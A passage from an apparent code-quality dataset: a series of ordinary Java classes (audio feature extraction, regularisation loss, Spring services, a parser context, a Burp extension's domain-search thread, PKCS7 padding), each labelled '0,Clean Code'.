    TreeNode leftTree=biTree.left;
    if (leftTree != null) {
      preOrderRe(leftTree);
    }
    TreeNode rightTree=biTree.right;
    if (rightTree != null) {
      preOrderRe(rightTree);
    }
  }
}",0,Clean Code
"/** 
 * Apply Log Mel spectrogram to the given data. 
 */
public class LogMelSpectrogram implements AudioProcessor {
  private static final int N_FFT=400;
  private static final int HOP_LENGTH=160;
  private NDArray melFilters;
  /** 
 * Constructs a new instance of  {@code LogMelSpectrogram}.
 * @param melFilter the mel filter
 */
  public LogMelSpectrogram(  NDArray melFilter){
    this.melFilters=melFilter;
  }
  /** 
 * Loads the mel filterbank matrix for projecting STFT into a Mel spectrogram. <p>Allows decoupling librosa dependency; saved using: np.savez_compressed( ""mel_filters.npz"", mel_80=librosa.filters.mel(sr=16000, n_fft=400, n_mels=80), )
 * @param melFile the mdel file saved in .npz format
 * @param numMel number of mel
 * @param manager manager to set for the content
 * @return a new instance of {@code LogMelSpectrogram}
 * @throws IOException file not loadable
 */
  public static LogMelSpectrogram newInstance(  Path melFile,  int numMel,  NDManager manager) throws IOException {
    try (InputStream is=Files.newInputStream(melFile)){
      return newInstance(is,numMel,manager);
    }
   }
  /** 
 * Loads the mel filterbank matrix for projecting STFT into a Mel spectrogram.
 * @param is the input stream
 * @param numMel number of mel
 * @param manager manager to set for the content
 * @return a new instance of {@code LogMelSpectrogram}
 * @throws IOException file not loadable
 */
  public static LogMelSpectrogram newInstance(  InputStream is,  int numMel,  NDManager manager) throws IOException {
    return new LogMelSpectrogram(NDList.decode(manager,is).get(""mel_"" + numMel));
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public NDArray extractFeatures(  NDManager manager,  NDArray samples){
    NDArray window=manager.hanningWindow(N_FFT);
    NDArray stft=samples.stft(N_FFT,HOP_LENGTH,true,window,true);
    NDArray magnitudes=stft.get("":,:-1"").abs().pow(2);
    NDArray melSpec=melFilters.matMul(magnitudes);
    melSpec.attach(manager);
    NDArray logSpec=melSpec.clip(1e-10,Float.MAX_VALUE).log10();
    logSpec=logSpec.maximum(logSpec.max().sub(8.0f));
    logSpec=logSpec.add(4.0f).div(4.0f);
    return logSpec;
  }
}
",0,Clean Code
"/** 
 * {@code L2WeightDecay} calculates L2 penalty of a set of parameters. Used for regularization.<p>L2 loss is defined by \(L2 = \lambda \sum_i {W_i}^2\).
 */
public class L2WeightDecay extends Loss {
  private float lambda;
  private NDList parameters;
  /** 
 * Calculates L2 weight decay for regularization.
 * @param parameters holds the model weights that will be penalized
 */
  public L2WeightDecay(  NDList parameters){
    this(""L2WeightDecay"",parameters);
  }
  /** 
 * Calculates L2 weight decay for regularization.
 * @param name the name of the penalty
 * @param parameters holds the model weights that will be penalized
 */
  public L2WeightDecay(  String name,  NDList parameters){
    this(name,parameters,1);
  }
  /** 
 * Calculates L2 weight decay for regularization.
 * @param name the name of the penalty
 * @param parameters holds the model weights that will be penalized
 * @param lambda the weight to apply to the penalty value, default 1
 */
  public L2WeightDecay(  String name,  NDList parameters,  float lambda){
    super(name);
    this.lambda=lambda;
    this.parameters=parameters;
  }
  private NDArray l2(  NDArray w){
    return ((w.square()).sum());
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public NDArray evaluate(  NDList label,  NDList prediction){
    NDManager manager=parameters.getManager();
    NDArray sum=manager.create(0.0f);
    for (    NDArray wi : parameters) {
      sum.addi(l2(wi));
    }
    return sum.muli(lambda);
  }
}
",0,Clean Code
"/** 
 * 基于 Spring EL 表达式的  {@link RateLimiterKeyResolver} 实现类
 * @author 芋道源码
 */
public class ExpressionRateLimiterKeyResolver implements RateLimiterKeyResolver {
  private final ParameterNameDiscoverer parameterNameDiscoverer=new DefaultParameterNameDiscoverer();
  private final ExpressionParser expressionParser=new SpelExpressionParser();
  @Override public String resolver(  JoinPoint joinPoint,  RateLimiter rateLimiter){
    Method method=getMethod(joinPoint);
    Object[] args=joinPoint.getArgs();
    String[] parameterNames=this.parameterNameDiscoverer.getParameterNames(method);
    StandardEvaluationContext evaluationContext=new StandardEvaluationContext();
    if (ArrayUtil.isNotEmpty(parameterNames)) {
      for (int i=0; i < parameterNames.length; i++) {
        evaluationContext.setVariable(parameterNames[i],args[i]);
      }
    }
    Expression expression=expressionParser.parseExpression(rateLimiter.keyArg());
    return expression.getValue(evaluationContext,String.class);
  }
  private static Method getMethod(  JoinPoint point){
    MethodSignature signature=(MethodSignature)point.getSignature();
    Method method=signature.getMethod();
    if (!method.getDeclaringClass().isInterface()) {
      return method;
    }
    try {
      return point.getTarget().getClass().getDeclaredMethod(point.getSignature().getName(),method.getParameterTypes());
    }
 catch (    NoSuchMethodException e) {
      throw new RuntimeException(e);
    }
  }
}
",0,Clean Code
"public abstract class AbstractJdbcExecutionQueuedStorage extends AbstractJdbcRepository {
  protected io.kestra.jdbc.AbstractJdbcRepository<ExecutionQueued> jdbcRepository;
  public AbstractJdbcExecutionQueuedStorage(  io.kestra.jdbc.AbstractJdbcRepository<ExecutionQueued> jdbcRepository){
    this.jdbcRepository=jdbcRepository;
  }
  public void save(  ExecutionQueued executionQueued){
    Map<Field<Object>,Object> fields=this.jdbcRepository.persistFields(executionQueued);
    this.jdbcRepository.persist(executionQueued,fields);
  }
  public void pop(  String tenantId,  String namespace,  String flowId,  Consumer<Execution> consumer){
    this.jdbcRepository.getDslContextWrapper().transaction(configuration -> {
      var select=DSL.using(configuration).select(AbstractJdbcRepository.field(""value"")).from(this.jdbcRepository.getTable()).where(buildTenantCondition(tenantId)).and(field(""namespace"").eq(namespace)).and(field(""flow_id"").eq(flowId)).orderBy(field(""date"").asc()).limit(1).forUpdate().skipLocked();
      Optional<ExecutionQueued> maybeExecution=this.jdbcRepository.fetchOne(select);
      if (maybeExecution.isPresent()) {
        consumer.accept(maybeExecution.get().getExecution());
        this.jdbcRepository.delete(maybeExecution.get());
      }
    }
);
  }
  /** 
 * This method should only be used for administration purpose via a command
 */
  public List<ExecutionQueued> getAllForAllTenants(){
    return this.jdbcRepository.getDslContextWrapper().transactionResult(configuration -> {
      var select=DSL.using(configuration).select(AbstractJdbcRepository.field(""value"")).from(this.jdbcRepository.getTable());
      return this.jdbcRepository.fetch(select);
    }
);
  }
}
",0,Clean Code
"/** 
 * This AttributeVisitor recursively marks all necessary inner class information in the attributes that it visits.
 * @see ClassUsageMarker
 * @author Eric Lafortune
 */
public class InnerUsageMarker implements AttributeVisitor, InnerClassesInfoVisitor, ConstantVisitor, ClassVisitor {
  private final ClassUsageMarker classUsageMarker;
  private boolean attributeUsed;
  private boolean classUsed;
  /** 
 * Creates a new InnerUsageMarker.
 * @param classUsageMarker the marker to mark and check the classes andclass members.
 */
  public InnerUsageMarker(  ClassUsageMarker classUsageMarker){
    this.classUsageMarker=classUsageMarker;
  }
  public void visitAnyAttribute(  Clazz clazz,  Attribute attribute){
  }
  public void visitInnerClassesAttribute(  Clazz clazz,  InnerClassesAttribute innerClassesAttribute){
    attributeUsed=false;
    innerClassesAttribute.innerClassEntriesAccept(clazz,this);
    if (attributeUsed) {
      classUsageMarker.markAsUsed(innerClassesAttribute);
      markConstant(clazz,innerClassesAttribute.u2attributeNameIndex);
    }
  }
  public void visitInnerClassesInfo(  Clazz clazz,  InnerClassesInfo innerClassesInfo){
    boolean innerClassesInfoUsed=classUsageMarker.isUsed(innerClassesInfo);
    if (!innerClassesInfoUsed) {
      classUsed=true;
      innerClassesInfo.innerClassConstantAccept(clazz,this);
      innerClassesInfoUsed=classUsed;
      classUsed=true;
      innerClassesInfo.outerClassConstantAccept(clazz,this);
      innerClassesInfoUsed&=classUsed;
      if (innerClassesInfoUsed) {
        classUsageMarker.markAsUsed(innerClassesInfo);
        innerClassesInfo.innerNameConstantAccept(clazz,this);
      }
    }
    attributeUsed|=innerClassesInfoUsed;
  }
  public void visitClassConstant(  Clazz clazz,  ClassConstant classConstant){
    classUsed=classUsageMarker.isUsed(classConstant);
    if (!classUsed) {
      classUsed=true;
      classConstant.referencedClassAccept(this);
      if (classUsed) {
        classUsageMarker.markAsUsed(classConstant);
        markConstant(clazz,classConstant.u2nameIndex);
      }
    }
  }
  public void visitUtf8Constant(  Clazz clazz,  Utf8Constant utf8Constant){
    classUsageMarker.markAsUsed(utf8Constant);
  }
  @Override public void visitAnyClass(  Clazz clazz){
    throw new UnsupportedOperationException(this.getClass().getName() + "" does not support "" + clazz.getClass().getName());
  }
  @Override public void visitProgramClass(  ProgramClass programClass){
    classUsed=classUsageMarker.isUsed(programClass);
  }
  @Override public void visitLibraryClass(  LibraryClass libraryClass){
    classUsed=true;
  }
  /** 
 * Marks the given constant pool entry of the given class. This includes visiting any other referenced constant pool entries.
 */
  private void markConstant(  Clazz clazz,  int index){
    clazz.constantPoolEntryAccept(index,this);
  }
}",0,Clean Code
"/** 
 * Identifies a method or constructor.
 * @param < D > the type declaring this field
 * @param < R > the return type of this method
 */
public final class MethodId<D,R> {
  final TypeId<D> declaringType;
  final TypeId<R> returnType;
  final String name;
  final TypeList parameters;
  /** 
 * cached converted state 
 */
  final CstNat nat;
  final CstMethodRef constant;
  MethodId(  TypeId<D> declaringType,  TypeId<R> returnType,  String name,  TypeList parameters){
    if (declaringType == null || returnType == null || name == null || parameters == null) {
      throw new NullPointerException();
    }
    this.declaringType=declaringType;
    this.returnType=returnType;
    this.name=name;
    this.parameters=parameters;
    this.nat=new CstNat(new CstString(name),new CstString(descriptor(false)));
    this.constant=new CstMethodRef(declaringType.constant,nat);
  }
  public TypeId<D> getDeclaringType(){
    return declaringType;
  }
  public TypeId<R> getReturnType(){
    return returnType;
  }
  /** 
 * Returns true if this method is a constructor for its declaring class.
 */
  public boolean isConstructor(){
    return name.equals(""<init>"");
  }
  /** 
 * Returns true if this method is the static initializer for its declaring class.
 */
  public boolean isStaticInitializer(){
    return name.equals(""<clinit>"");
  }
  /** 
 * Returns the method's name. This is ""&lt;init&gt;"" if this is a constructor or ""&lt;clinit&gt;"" if a static initializer
 */
  public String getName(){
    return name;
  }
  public List<TypeId<?>> getParameters(){
    return parameters.asList();
  }
  /** 
 * Returns a descriptor like ""(Ljava/lang/Class;[I)Ljava/lang/Object;"".
 */
  String descriptor(  boolean includeThis){
    StringBuilder result=new StringBuilder();
    result.append(""("");
    if (includeThis) {
      result.append(declaringType.name);
    }
    for (    TypeId t : parameters.types) {
      result.append(t.name);
    }
    result.append("")"");
    result.append(returnType.name);
    return result.toString();
  }
  Prototype prototype(  boolean includeThis){
    return Prototype.intern(descriptor(includeThis));
  }
  @Override public boolean equals(  Object o){
    return o instanceof MethodId && ((MethodId<?,?>)o).declaringType.equals(declaringType) && ((MethodId<?,?>)o).name.equals(name)&& ((MethodId<?,?>)o).parameters.equals(parameters)&& ((MethodId<?,?>)o).returnType.equals(returnType);
  }
  @Override public int hashCode(){
    int result=17;
    result=31 * result + declaringType.hashCode();
    result=31 * result + name.hashCode();
    result=31 * result + parameters.hashCode();
    result=31 * result + returnType.hashCode();
    return result;
  }
  @Override public String toString(){
    return declaringType + ""."" + name+ ""(""+ parameters+ "")"";
  }
}
",0,Clean Code
"public class ThreadSearhDomain extends Thread {
  private List<IHttpRequestResponse> messages;
  private List<DomainProducer> plist;
  private static IBurpExtenderCallbacks callbacks=BurpExtender.getCallbacks();
  public PrintWriter stdout;
  public PrintWriter stderr;
  public IExtensionHelpers helpers=callbacks.getHelpers();
  GUIMain guiMain;
  private boolean searchThirdPart;
  public ThreadSearhDomain(  GUIMain guiMain,  List<IHttpRequestResponse> messages,  boolean searchThirdPart){
    this.guiMain=guiMain;
    this.messages=messages;
    stdout=BurpExtender.getStdout();
    stderr=BurpExtender.getStderr();
    this.setName(this.toString());
    this.searchThirdPart=searchThirdPart;
  }
  @Override public void run(){
    stdout.println(""~~~~~~~~~~~~~Start Search Domain~~~~~~~~~~~~~"");
    guiMain.getInputQueue().addAll(messages);
    plist=new ArrayList<DomainProducer>();
    for (int i=0; i <= 20; i++) {
      DomainProducer p=new DomainProducer(guiMain,guiMain.getInputQueue(),i,searchThirdPart);
      p.setDaemon(true);
      p.start();
      plist.add(p);
    }
    try {
      for (      DomainProducer p : plist) {
        p.join();
      }
    }
 catch (    InterruptedException e) {
      stdout.println(""force stop received"");
      e.printStackTrace();
    }
    stdout.println(""~~~~~~~~~~~~~Search Domain Done~~~~~~~~~~~~~"");
  }
  @Deprecated public void stopThreads(){
    for (    DomainProducer p : plist) {
      p.stopThread();
    }
    stdout.println(""threads stopped!"");
  }
  public void forceStopThreads(){
    this.interrupt();
    stdout.println(""~~~~~~~~~~~~~force stop main thread,all sub-threads will exit!~~~~~~~~~~~~~"");
  }
}
",0,Clean Code
"/** 
 * <p> 序列化生成器，利用atomic原子性保证子调用序列在 {@link TraceContext#getTraceId()}下唯一
 * @author zhaoyb1990
 */
public class SequenceGenerator {
  private static final LoadingCache<String,AtomicInteger> SEQUENCE_CACHE=CacheBuilder.newBuilder().expireAfterWrite(30,TimeUnit.SECONDS).maximumSize(4096L).build(new CacheLoader<String,AtomicInteger>(){
    @Override public AtomicInteger load(    String traceId) throws Exception {
      return new AtomicInteger(0);
    }
  }
);
  /** 
 * 生成序列: 根据traceId生成sequence序列
 * @param traceId traceId
 * @return 生成的sequence
 */
  public static Integer generate(  String traceId){
    try {
      return SEQUENCE_CACHE.get(traceId).incrementAndGet();
    }
 catch (    Exception e) {
      return -1;
    }
  }
  /** 
 * 读取当前sequence;
 * @param traceId traceId
 * @return 当前的sequence
 */
  public static Integer read(  String traceId){
    try {
      return SEQUENCE_CACHE.get(traceId).get();
    }
 catch (    Exception e) {
      return -1;
    }
  }
  /** 
 * 回滚序列: 根据traceId做索引
 * @param traceId traceID
 * @return 回滚后sequence
 */
  public static Integer rollback(  String traceId){
    try {
      return SEQUENCE_CACHE.get(traceId).decrementAndGet();
    }
 catch (    Exception e) {
      return -1;
    }
  }
  /** 
 * 失效序列
 * @param traceId traceID
 */
  public static void invalid(  String traceId){
    try {
      SEQUENCE_CACHE.invalidate(traceId);
    }
 catch (    Exception e) {
    }
  }
}
",0,Clean Code
"public class QNClient {
  /** 
 * 发送一条文字消息
 * @param uin     要发送的 群/好友
 * @param content 要发送的内容
 * @param type    类型，当发送给好友为0.否则为1
 */
  public static void send(  String uin,  String content,  int type){
    ChatActivityFacade.sendMessage(Utils.getQQAppInterface(),HostInfo.getHostInfo().getApplication(),SessionInfoImpl.createSessionInfo(uin,type),content);
  }
  /** 
 * 发送一条图片消息
 * @param uin     要发送的 群/好友
 * @param content 要发送的图片，使用 url/文件地址
 */
  public static void sendImg(  long uin,  String content){
    if (content.startsWith(""http"") || content.startsWith(""https"")) {
    }
 else {
    }
  }
  /** 
 * 发送一条语音消息
 * @param uin     要发送的 群/好友
 * @param content 要发送的语音，使用 url/文件地址
 */
  public static void sendRecord(  long uin,  String content){
    if (content.startsWith(""http"") || content.startsWith(""https"")) {
    }
 else {
    }
  }
  /** 
 * 发送卡片消息 NOTICE：需要高级白名单
 * @param uin     要发送的 群/好友
 * @param content xml/json
 */
  public static void sendCard(  long uin,  String content){
    if (!LicenseStatus.isAsserted()) {
      return;
    }
  }
  /** 
 * 踢出一个人
 * @param groupUin 群id
 * @param uin      成员id
 */
  public static void kick(  long groupUin,  long uin){
  }
  /** 
 * 禁言一个人
 * @param groupUin 群id
 * @param uin      成员id
 * @param time     时间
 */
  public static void mute(  long groupUin,  long uin,  int time){
  }
  /** 
 * 开启全体禁言
 * @param groupUin 群id
 */
  public static void muteAll(  long groupUin){
  }
}
",0,Clean Code
"public interface TileState extends Keyed, TileActionResolver {
  TileState UNKNOWN=new Impl(Key.bluemap(""unknown""));
  TileState RENDERED=new Impl(Key.bluemap(""rendered""),(changed,bounds) -> null);
  TileState RENDERED_EDGE=new Impl(Key.bluemap(""rendered-edge""),(changed,bounds) -> null);
  TileState OUT_OF_BOUNDS=new Impl(Key.bluemap(""out-of-bounds""),(changed,bounds) -> null);
  TileState NOT_GENERATED=new Impl(Key.bluemap(""not-generated""));
  TileState MISSING_LIGHT=new Impl(Key.bluemap(""missing-light""));
  TileState LOW_INHABITED_TIME=new Impl(Key.bluemap(""low-inhabited-time""));
  TileState CHUNK_ERROR=new Impl(Key.bluemap(""chunk-error""));
  TileState RENDER_ERROR=new Impl(Key.bluemap(""render-error""),(changed,bounds) -> null);
  Registry<TileState> REGISTRY=new Registry<>(UNKNOWN,RENDERED,RENDERED_EDGE,OUT_OF_BOUNDS,NOT_GENERATED,MISSING_LIGHT,LOW_INHABITED_TIME,CHUNK_ERROR,RENDER_ERROR);
@Getter @RequiredArgsConstructor class Impl implements TileState {
    private final Key key;
    private final TileActionResolver resolver;
    public Impl(    Key key){
      this.key=key;
      this.resolver=(changed,bounds) -> {
        if (!changed)         return noActionThisNextState();
        return null;
      }
;
    }
    @Override public String toString(){
      return key.getFormatted();
    }
    @Override public ActionAndNextState findActionAndNextState(    boolean changed,    BoundsSituation bounds){
      return resolver.findActionAndNextState(changed,bounds);
    }
    private ActionAndNextState noActionThisNextState;
    private ActionAndNextState noActionThisNextState(){
      if (noActionThisNextState == null)       noActionThisNextState=new ActionAndNextState(Action.NONE,this);
      return noActionThisNextState;
    }
  }
}
",0,Clean Code
"/** 
 * @author <a href=""mailto:wangchao.star@gmail.com"">wangchao</a>
 * @version 1.0.0
 * @since 2019-12-07 23:17:00
 */
public class SeeVariableGenerator extends AbstractVariableGenerator {
  @Override public String generate(  PsiElement element){
    if (element instanceof PsiClass) {
      PsiClass superClass=((PsiClass)element).getSuperClass();
      PsiClass[] interfaces=((PsiClass)element).getInterfaces();
      List<String> superList=Lists.newArrayList();
      if (superClass != null) {
        if (!""Object"".equalsIgnoreCase(superClass.getName())) {
          superList.add(superClass.getName());
        }
      }
      if (interfaces.length > 0) {
        superList.addAll(Arrays.stream(interfaces).map(PsiClass::getName).collect(Collectors.toList()));
      }
      return superList.stream().map(sup -> ""@see "" + sup).collect(Collectors.joining(""\n""));
    }
 else     if (element instanceof PsiMethod) {
      StringBuilder seeString=new StringBuilder();
      PsiParameterList parameterList=((PsiMethod)element).getParameterList();
      for (      PsiParameter parameter : parameterList.getParameters()) {
        if (parameter == null || parameter.getTypeElement() == null) {
          continue;
        }
        seeString.append(""@see "").append(parameter.getTypeElement().getText()).append(""\n"");
      }
      PsiTypeElement returnTypeElement=((PsiMethod)element).getReturnTypeElement();
      if (returnTypeElement != null && !""void"".equals(returnTypeElement.getText())) {
        seeString.append(""@see "").append(returnTypeElement.getText()).append(""\n"");
      }
      return seeString.toString();
    }
 else     if (element instanceof PsiField) {
      String type=((PsiField)element).getType().getPresentableText();
      if (Consts.BASE_TYPE_SET.contains(type)) {
        return """";
      }
      return ""@see "" + type;
    }
 else {
      return """";
    }
  }
}",0,Clean Code
"/** 
 * @author zlt<p> Blog: http://zlt2000.gitee.io Github: https://github.com/zlt2000
 */
@Slf4j @RequiredArgsConstructor @Service public class ClientServiceImpl extends SuperServiceImpl<ClientMapper,Client> implements IClientService {
  private final static String LOCK_KEY_CLIENTID=""clientId:"";
  private final PasswordEncoder passwordEncoder;
  private final DistributedLock lock;
  @Override public void saveClient(  Client client) throws Exception {
    client.setClientSecret(passwordEncoder.encode(client.getClientSecretStr()));
    String clientId=client.getClientId();
    if (client.getId() == null) {
      client.setCreatorId(LoginUserContextHolder.getUser().getId());
    }
    super.saveOrUpdateIdempotency(client,lock,LOCK_KEY_CLIENTID + clientId,new QueryWrapper<Client>().eq(""client_id"",clientId),clientId + ""已存在"");
  }
  @Override public PageResult<Client> listClient(  Map<String,Object> params,  boolean isPage){
    Page<Client> page;
    if (isPage) {
      page=new Page<>(MapUtils.getInteger(params,""page""),MapUtils.getInteger(params,""limit""));
    }
 else {
      page=new Page<>(1,-1);
    }
    List<Client> list=baseMapper.findList(page,params);
    page.setRecords(list);
    return PageResult.<Client>builder().data(list).code(0).count(page.getTotal()).build();
  }
  @Override public void delClient(  long id){
    baseMapper.deleteById(id);
  }
  @Override public Client loadClientByClientId(  String clientId){
    QueryWrapper<Client> wrapper=Wrappers.query();
    wrapper.eq(""client_id"",clientId);
    return this.getOne(wrapper);
  }
}
",0,Clean Code
"/** 
 * <p> 主数据模型列信息表 实体VO </p>
 * @author AllDataDC
 * @date 2022-11-26
 */
@Data public class ModelColumnVo implements Serializable {
  private static final long serialVersionUID=1L;
  private String id;
  private String status;
  @JsonFormat(pattern=""yyyy-MM-dd HH:mm:ss"",timezone=""GMT+8"") private LocalDateTime createTime;
  private String modelId;
  private String columnName;
  private String columnComment;
  private String columnType;
  private String columnLength;
  private String columnScale;
  private String defaultValue;
  private String isSystem;
  private String isPk;
  private String isRequired;
  private String isInsert;
  private String isEdit;
  private String isDetail;
  private String isList;
  private String isQuery;
  private String queryType;
  private String isBindDict;
  private String bindDictTypeId;
  private String bindDictColumn;
  private String htmlType;
  private Integer sort;
}",0,Clean Code
"/** 
 * mica 未知异常转译和发送，方便监听，对未知异常统一处理。Order 排序优先级低
 * @author L.cm
 */
@Slf4j @Order @RestControllerAdvice @AutoConfiguration @ConditionalOnClass({Servlet.class,DispatcherServlet.class}) @ConditionalOnWebApplication(type=ConditionalOnWebApplication.Type.SERVLET) public class MicaExceptionTranslator {
  private final IMicaContext micaContext;
  private final ApplicationEventPublisher publisher;
  @Autowired public MicaExceptionTranslator(  ObjectProvider<IMicaContext> micaContextProvider,  ApplicationEventPublisher publisher){
    this.micaContext=micaContextProvider.getIfAvailable(DefaultMicaContext::new);
    this.publisher=publisher;
  }
  @ExceptionHandler(ServiceException.class) @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR) public R<Object> handleError(  ServiceException e){
    R<Object> result=e.getResult();
    if (result == null) {
      log.error(""业务异常"",e);
      result=R.fail(SystemCode.FAILURE,e.getMessage());
      publishEvent(e);
    }
    return result;
  }
  @ExceptionHandler(Throwable.class) @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR) public R<Object> handleError(  Throwable e){
    log.error(""未知异常"",e);
    publishEvent(e);
    return R.fail(SystemCode.FAILURE);
  }
  private void publishEvent(  Throwable error){
    MicaErrorEvent event=new MicaErrorEvent();
    event.setErrorType(ErrorType.REQUEST);
    event.setRequestId(micaContext.getRequestId());
    HttpServletRequest request=WebUtil.getRequest();
    event.setRequestMethod(request.getMethod());
    String requestUrl=request.getRequestURI();
    String queryString=request.getQueryString();
    if (StringUtil.isNotBlank(queryString)) {
      requestUrl=requestUrl + StringPool.QUESTION_MARK + queryString;
    }
    event.setRequestIp(WebUtil.getIP(request));
    event.setRequestUrl(requestUrl);
    ErrorUtil.initErrorInfo(error,event);
    publisher.publishEvent(event);
  }
}
",0,Clean Code
"/** 
 * 提供基于 PKCS7 算法的加解密接口. <p> 参考自：jFinal 方便使用
 * @author L.cm
 */
public class Pkcs7Encoder {
  /** 
 * 默认为 16，保持跟其他语言的一致性
 */
  private static final int BLOCK_SIZE=16;
  /** 
 * PKCS7 编码 padding 补位
 * @param src 原数据
 * @return padding 补位
 */
  public static byte[] encode(  byte[] src){
    int count=src.length;
    int amountToPad=BLOCK_SIZE - (count % BLOCK_SIZE);
    if (amountToPad == 0) {
      amountToPad=BLOCK_SIZE;
    }
    byte pad=(byte)(amountToPad & 0xFF);
    byte[] pads=new byte[amountToPad];
    for (int index=0; index < amountToPad; index++) {
      pads[index]=pad;
    }
    int length=count + amountToPad;
    byte[] dest=new byte[length];
    System.arraycopy(src,0,dest,0,count);
    System.arraycopy(pads,0,dest,count,amountToPad);
    return dest;
  }
  /** 
 * PKCS7 解码
 * @param decrypted 编码的数据
 * @return 解码后的数据
 */
  public static byte[] decode(  byte[] decrypted){
    int pad=decrypted[decrypted.length - 1];
    if (pad < 1 || pad > BLOCK_SIZE) {
      pad=0;
    }
    if (pad > 0) {
      return Arrays.copyOfRange(decrypted,0,decrypted.length - pad);
    }
    return decrypted;
  }
}
",0,Clean Code
"public static class Cmp_stmtContext extends ParserRuleContext {
  public TerminalNode T_CMP(){
    return getToken(HiveSqlParser.T_CMP,0);
  }
  public List<Cmp_sourceContext> cmp_source(){
    return getRuleContexts(Cmp_sourceContext.class);
  }
  public Cmp_sourceContext cmp_source(  int i){
    return getRuleContext(Cmp_sourceContext.class,i);
  }
  public TerminalNode T_COMMA(){
    return getToken(HiveSqlParser.T_COMMA,0);
  }
  public TerminalNode T_ROW_COUNT(){
    return getToken(HiveSqlParser.T_ROW_COUNT,0);
  }
  public TerminalNode T_SUM(){
    return getToken(HiveSqlParser.T_SUM,0);
  }
  public Cmp_stmtContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_cmp_stmt;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterCmp_stmt(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitCmp_stmt(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitCmp_stmt(this);
 else     return visitor.visitChildren(this);
  }
}",0,Clean Code
"/** 
 * This classes is a data class that is used to query which methods need to be reconsidered for side effects when side effects for a certain method are derived.
 */
public class ReverseDependencyStore {
  private final MultiValueMap<ProgramMethodOptimizationInfo,Method> methodsByProgramMethodOptimizationInfo;
  private final MultiValueMap<Method,ClassMemberPair> calledBy;
  /** 
 * Constructs a ReverseDependencyStore by its contents.
 * @param calledBy Maps a method to all LocatedMembers that refer to it
 * @param methodsByProgramMethodOptimizationInfo Maps some optimizationInfo to all Methods that use it
 */
  public ReverseDependencyStore(  MultiValueMap<Method,ClassMemberPair> calledBy,  MultiValueMap<ProgramMethodOptimizationInfo,Method> methodsByProgramMethodOptimizationInfo){
    this.calledBy=calledBy;
    this.methodsByProgramMethodOptimizationInfo=methodsByProgramMethodOptimizationInfo;
  }
  /** 
 * This MemberVisitor travels to the set of influenced methods when side effects for a certain method are derived. This is a two step process: 1) get all the methods which share the same methodOptimizationInfo (i.e. all inherited methods share their methodOptimizationInfo throughout the whole tree) 2) get all the methods which refer to a methods collected in step 1
 */
public class InfluencedMethodTraveller implements MemberVisitor {
    private final MemberVisitor memberVisitor;
    public InfluencedMethodTraveller(    MemberVisitor memberVisitor){
      this.memberVisitor=memberVisitor;
    }
    @Override public void visitProgramMethod(    ProgramClass programClass,    ProgramMethod programMethod){
      MethodOptimizationInfo methodOptimizationInfo=MethodOptimizationInfo.getMethodOptimizationInfo(programMethod);
      if (methodOptimizationInfo instanceof ProgramMethodOptimizationInfo) {
        ProgramMethodOptimizationInfo info=(ProgramMethodOptimizationInfo)methodOptimizationInfo;
        for (        Method rootMethod : methodsByProgramMethodOptimizationInfo.get(info)) {
          if (!calledBy.keySet().contains(rootMethod)) {
            continue;
          }
          for (          ClassMemberPair locatedMember : calledBy.get(rootMethod)) {
            locatedMember.accept(memberVisitor);
          }
        }
      }
    }
  }
}",0,Clean Code
"/** 
 * @author 作者 owen E-mail: 624191343@qq.com
 */
@Slf4j @Service public class SysMenuServiceImpl extends SuperServiceImpl<SysMenuMapper,SysMenu> implements ISysMenuService {
  @Resource private ISysRoleMenuService roleMenuService;
  @Transactional(rollbackFor=Exception.class) @Override public void setMenuToRole(  Long roleId,  Set<Long> menuIds){
    roleMenuService.delete(roleId,null);
    if (!CollectionUtils.isEmpty(menuIds)) {
      List<SysRoleMenu> roleMenus=new ArrayList<>(menuIds.size());
      menuIds.forEach(menuId -> roleMenus.add(new SysRoleMenu(roleId,menuId)));
      roleMenuService.saveBatch(roleMenus);
    }
  }
  /** 
 * 角色菜单列表
 * @param roleIds
 * @return
 */
  @Override public List<SysMenu> findByRoles(  Set<Long> roleIds){
    return roleMenuService.findMenusByRoleIds(roleIds,null);
  }
  /** 
 * 角色菜单列表
 * @param roleIds 角色ids
 * @param roleIds 是否菜单
 * @return
 */
  @Override public List<SysMenu> findByRoles(  Set<Long> roleIds,  Integer type){
    return roleMenuService.findMenusByRoleIds(roleIds,type);
  }
  @Override public List<SysMenu> findByRoleCodes(  Set<String> roleCodes,  Integer type){
    return roleMenuService.findMenusByRoleCodes(roleCodes,type);
  }
  @Override public List<SysMenu> findByUserId(  Long userId,  Integer type){
    return baseMapper.findByUserId(userId,type);
  }
  /** 
 * 查询所有菜单
 */
  @Override public List<SysMenu> findAll(){
    return baseMapper.selectList(new QueryWrapper<SysMenu>().orderByAsc(""sort""));
  }
  /** 
 * 查询所有一级菜单
 */
  @Override public List<SysMenu> findOnes(){
    return baseMapper.selectList(new QueryWrapper<SysMenu>().eq(""type"",1).orderByAsc(""sort""));
  }
}
",0,Clean Code
"/** 
 * @author geekidea
 * @date 2022/7/2
 */
@Data public class SimpleGeneratorConfig {
  /** 
 * 名称
 */
  private String name;
  /** 
 * 备注
 */
  private String desc;
  /** 
 * 作者
 */
  private String author;
  /** 
 * 模块名称
 */
  private String moduleName;
  /** 
 * 是否生成controller，默认生成
 */
  private boolean generateController=true;
  /** 
 * 是否生成service及serviceImpl，默认生成
 */
  private boolean generateService=true;
  /** 
 * 是否生成mapper及xml，默认生成
 */
  private boolean generateMapper=true;
}",0,Clean Code
"public class SearchDataBeanUtil {
  public static SearchDataBean convertFriendInfo2SearchDataBean(  V2TIMFriendInfoResult v2TIMFriendInfoResult){
    if (v2TIMFriendInfoResult == null) {
      return null;
    }
    V2TIMFriendInfo friendInfo=v2TIMFriendInfoResult.getFriendInfo();
    SearchDataBean dataBean=new SearchDataBean();
    dataBean.setUserID(friendInfo.getUserID());
    dataBean.setNickName(friendInfo.getUserProfile().getNickName());
    dataBean.setRemark(friendInfo.getFriendRemark());
